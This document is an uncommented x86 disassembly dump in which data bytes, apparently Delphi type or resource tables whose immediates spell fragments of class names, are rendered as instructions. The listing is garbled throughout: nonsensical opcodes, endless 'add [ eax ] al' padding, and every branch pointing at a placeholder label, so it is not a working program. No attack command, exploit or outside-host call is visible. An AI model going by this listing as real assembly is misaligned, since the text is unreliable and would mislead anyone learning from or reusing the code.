inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or al 0x11
inc eax
add [ ecx + edx ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x2f4c0040 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] cl
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x432d78c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
or al 0x11
inc eax
add [ edx + ebp ] ch
inc ebx
add al ah
adc al 0x41
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al ch
daa
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x432a ] ch
adc [ eax ] al
nop
call 0x8437419
or al 0x54
or al 0x11
outsb
je r-xdata
jbe r-xdata
inc ebp
inc ebx
jpe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sub al 0x32
inc ebx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
inc eax
aaa
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xc ] si
adc [ eax ] eax
call 0xffffffffa04374c4
xor [ ebx ] eax
or [ ecx ] dl
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4333b4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax + 0x37 ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] cl
inc eax
add [ eax + 0x37 ] al
inc ebx
add ah bh
inc ebx
add [ eax ] al
adc [ eax ] al
push esp
xor [ ebx ] eax
or [ edi ] cl
push esp
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
mov ah 0x33
inc ebx
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
sub al 0x33
inc ebx
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x35 ] dh
inc ebx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43332cc0 ] cl
or al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ebx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + ebp * 2 - 0x78b7ffbd ] ch
inc ebx
add [ edi + eax * 4 + 0x43 ] al
add [ eax + ecx * 4 ] dl
inc ebx
add al dh
push 0x43
add [ edx + esi * 2 ] dh
inc ebx
add [ eax - 0x3fffbc8f ] bl
jpe r-xdata
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add al bl
mov eax [ ebx ]
sub al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] al
or [ edx ] ch
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push es
add [ eax + 0x78 ] al
inc ebx
add [ edx + ecx * 4 + 0x43 ] al
add al al
0x7c800043 0x43
hlt
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x1540040 ] ch
add [ eax ] al
dec ebx
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
jo r-xdata
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add al ah
adc al 0x41
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pushfd
xor al [ ebx ]
or [ edi ] dl
lea eax [ eax ]
int3
jbe r-xdata
add [ esi ] dh
aaa
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add al ah
adc al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
sub [ ebx + eax * 2 ] dh
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx + ebp * 2 - 0x6747ffbd ] al
inc ebx
add [ eax + 0x6c00438c ] dh
inc edi
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add al ch
imul eax [ ebx ] 0xffffff94
jne r-xdata
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_43366b
xchg esp eax
inc ebx
add [ eax ] cl
xchg ebp eax
inc ebx
add [ eax ] ah
xchg ebp eax
inc ebx
add [ eax ] bh
xchg esi eax
inc ebx
add [ esp + edx * 4 + 0x43 ] cl
add ah cl
xchg ebx eax
inc ebx
add al dh
xchg ebx eax
inc ebx
add ah bh
0x96980043 0x43
test [ edx + 0x7e540043 ] bl
inc ebx
add al cl
jae r-xdata
inc ebx
add al al
add [ eax ] al
lea eax [ ebx ]
jo r-xdata
pop es
add [ eax + 0x6a ] bh
inc ebx
add [ eax - 0x37ffbc95 ] bh
imul eax [ ebx ] 0x50
push 0x43
add [ edx + edi * 2 - 0x75bfffbd ] bl
inc ebx
add [ ecx + edx * 4 + 0x43 ] bl
add ah dl
xchg ecx eax
inc ebx
add ah dh
xchg ecx eax
inc ebx
add [ edx + edx * 4 ] dl
inc ebx
add [ edx + edx * 4 + 0x43 ] ch
add [ edx + edx * 4 - 0x6ca3ffbd ] ch
inc ebx
add [ ebx + edx * 4 - 0x6c73ffbd ] al
inc ebx
add [ ebx + edx * 4 - 0x6b6bffbd ] dl
inc ebx
add ah al
xchg esp eax
inc ebx
add [ ebx + edx * 4 - 0x6b93ffbd ] bl
inc ebx
add al dl
0x94e80043 0x43
inc ebx
add [ ebp + ecx * 4 + 0x43 ] ch
add [ eax - 0x3bffbc7e ] al
add [ ebx ] 0x24
pushfd
inc ebx
add al bl
add [ ebx ] 0xbc
jo r-xdata
je r-xdata
outsd
insb
int3
adc [ eax ] al
inc eax
add ah ch
jge r-xdata
inc ebx
add ah dh
jg r-xdata
add [ ecx + eax * 4 ] al
inc ebx
add [ ecx + eax * 4 ] ah
inc ebx
add al ch
add [ ebx ] sub_438234
xor [ edi + 0x43 ] bh
add [ eax + 0x7f ] al
inc ebx
add al cl
jg r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
push esp
adc [ eax ] al
add [ eax ] bh
add bh bh
mov eax 0x1004379
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ 0x65480600 ] 0x69
push 0x43245874
adc [ eax ] al
inc esp
add [ eax ] al
inc [ eax + 0x6f ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
add [ eax ] al
[ edi + ebp * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040002 ] al
add [ edx + ebp * 2 + 0x43 ] cl
add [ edx + ebp * 2 + 0x43 ] al
add [ eax + 0x2000437c ] dl
jle r-xdata
inc ebx
add [ eax + 0x7c00436f ] dh
jg r-xdata
add [ ebx ] 0xffffffb8
xchg edi eax
inc ebx
add [ eax + 0x40004399 ] ah
push 0x43
add [ edi + ecx * 4 ] al
inc ebx
add [ ebp + ecx * 4 - 0x6fbbffbd ] cl
inc ebx
add ah ch
nop
add [ eax - 0x53ffbc81 ] ch
add [ ebx ] 0xffffffc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x39 ] bl
inc ebx
jns r-xdata
call [ ecx + esi * 2 ]
jae r-xdata
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
[ eax + 0x6f ]
je r-xdata
add [ eax ] al
add [ edx ] 0x0
add al 0x4c
add [ eax ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x3974c08b
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
add [ eax + eax ] ah
add [ eax ] al
push eax
sub [ ebx ] eax
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
lodsb [ gs : esi ]
adc [ eax ] al
push esp
add [ eax ] eax
[ eax ]
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x640041b1 ] ah
pushfd
inc ebx
add ah dl
mov cl 0x41
add [ eax ] dl
inc ebx
add [ eax ] cl
mov dl 0x41
add [ edi - 0x4ea7ffbd ] bh
inc ecx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] ah
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add bh bh
adc al 0x71
jb r-xdata
dec esp
add [ eax ] al
dec [ edi + ebp * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x43245874
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
outsd
insb
nop
inc esp
aaa
inc ebx
add [ edi ] al
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
add ah bh
inc ebx
add ah ah
cmp [ eax + eax + 0x70 ] al
inc bx
js r-xdata
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0xff0000 ]
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
or [ ebx + 0x6f ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + edi ] ch
inc ebx
add [ esi ] al
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
jo r-xdata
fdivr [ eax ]
inc ebx
add [ eax ] al
adc [ eax ] eax
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
cmp al [ ebx ]
add ecx [ edx ]
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ edx + edi + 0x43 ] dh
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
cmp al [ ebx ]
push es
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x39 ] dh
inc ebx
outsb
imul ecx [ ebx + 0x433974c0 ] 0x0
add ecx [ eax ]
push esp
dec ecx
insd
add [ ecx + edi ] cl
inc esp
add [ eax - 0x17ffbc64 ] cl
inc ebx
add [ esi + 0x395c0043 ] ah
inc esp
add [ eax + 0x39 ] dh
inc esp
add ah bl
inc bx
add [ eax + 0x38004439 ] bl
inc ebx
add [ eax + 0x58004439 ] ah
inc ebx
add [ eax - 0x6fffbbc7 ] ch
pushfd
inc ebx
add [ eax + ebp * 2 + 0x43 ] cl
add [ eax + ebp * 2 + 0x67780043 ] cl
inc ebx
add [ ecx + edi + 0x39c00044 ] bh
inc esp
add [ edi + 0x650c0043 ] bl
inc ebx
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x5400439c ] bl
in eax 0x43
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
outsd
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
cmp al [ ebx ]
push es
inc eax
add [ ecx ] al
jns r-xdata
insb
inc ebp
jae r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add [ edx + edi + 0x43 ] esi
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
outsb
popad
jb r-xdata
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add al dl
cmp al [ ebx ]
push es
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + edi ] dl
inc ebx
add [ ecx + eax ] bh
add [ eax ] al
cmp al [ ebx ]
mov [ ecx ] al
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x78 ] al
inc ebx
add [ eax - 0x3fffbc47 ] al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al bh
lodsd [ esi ]
inc ebx
add ah dh
mov al 0x43
add [ edi + ebp * 4 ] ah
inc ebx
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ eax ] cl
mov bl 0x43
add [ eax ] al
add [ eax ] al
pop esp
cmp al 0x43
add bh bh
call [ ebx + edi + 0x43 ]
add [ eax ] al
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
cmp al [ ebx ]
mov eax eax
aam 0x3a
inc ebx
je r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rol [ edx + edi ] 0x43
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
add [ eax ] al
aas
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3c ] dh
inc ebx
add dh ch
inc ebx
add [ edx + eax ] al
add [ eax ] al
xor [ ebx + eax * 2 ] 0x0
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
add [ esp + edi + 0x43 ] bl
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ ebx + 0x433ad4c0 ] cl
inc ebx
mov al 0x41
insb
jae r-xdata
dec esi
popad
insd
mov eax eax
adc al 0x3a
inc ebx
add [ ecx ] al
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
js r-xdata
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
outsd
insb
jae r-xdata
mov eax eax
sbb [ ebx ] bh
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
inc ebx
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
rcr [ eax ] 0x3b
sub_4337aa
inc ebx
add [ ecx ] al
add [ eax ] al
call [ ecx + esi * 2 ]
jae r-xdata
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x640041b1 ] ah
pushfd
inc ebx
add ah dl
mov cl 0x41
add [ eax ] dl
inc ebx
add [ eax ] cl
mov dl 0x41
add [ edi - 0x4ea7ffbd ] bh
inc ecx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] ah
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add bh bh
adc al 0x71
jb r-xdata
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x3974c08b
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
add ah bh
inc ebx
add ah ah
cmp [ eax + eax + 0x70 ] al
inc bx
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
dec [ edi + ebp * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x43245874
add [ eax ] bh
add bh bh
mov eax 0x1004379
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0xff0000 ]
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
